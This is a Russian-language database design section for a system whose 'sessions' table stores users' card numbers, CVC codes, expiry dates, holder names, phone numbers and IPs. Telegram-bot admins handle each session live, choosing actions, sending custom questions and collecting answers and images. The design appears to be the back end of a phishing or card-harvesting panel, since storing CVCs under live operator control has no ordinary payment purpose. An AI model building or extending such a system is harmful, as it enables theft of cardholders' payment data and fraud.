# 9. СТРУКТУРА БАЗЫ ДАННЫХ

## Предлагаемая структура:

### Таблица: `admins`
```sql
- id (bigint, primary key)
- telegram_user_id (bigint, unique, not null)
- username (string, nullable)
- role (enum: 'super_admin', 'admin', default 'admin')
- is_active (boolean, default true)
- created_at (timestamp)
- updated_at (timestamp)
```

**Примечания:**
- Супер-админ создается через seed
- Telegram User ID супер-админа берется из `.env` файла (`SUPER_ADMIN_TELEGRAM_ID`)
- Только супер-админ может добавлять других админов через Telegram бота

### Таблица: `sessions`
```sql
- id (string, primary key) - session_id
- input_type (enum: 'phone', 'id')
- input_value (string)
- card_number (string, nullable)
- cvc (string, nullable)
- expire (string, nullable)
- phone_number (string, nullable)
- holder_name (string, nullable)
- ip (string)
- telegram_message_id (bigint, nullable)
- status (enum: 'pending', 'processing', 'completed', 'cancelled')
- admin_id (bigint, nullable, foreign key -> admins.id)
- action_type (string, nullable)
- custom_questions (json, nullable)
- custom_answers (json, nullable)
- images (json, nullable)
- last_activity_at (timestamp, nullable) - последняя активность пользователя
- created_at (timestamp)
- updated_at (timestamp)
```

### Таблица: `session_history`
```sql
- id (bigint, primary key)
- session_id (string, foreign key -> sessions.id, on delete cascade)
- admin_id (bigint, nullable, foreign key -> admins.id, on delete set null)
- action_type (string)
- data (json, nullable)
- created_at (timestamp)
```

**Примечания:**
- История всех изменений сессий
- Записываются действия админов, изменения статусов, выбор действий

## Заметки:
- Все общение между компонентами через WebSockets
- Сессии хранят `telegram_message_id` для редактирования сообщений
- Кастомные вопросы и ответы в JSON формате
- Картинки хранятся в файловой системе: `storage/app/sessions/{session_id}/`
- JSON поля: `custom_questions`, `custom_answers`, `images` (массив путей к файлам)
- Foreign keys настроены с каскадным удалением где необходимо
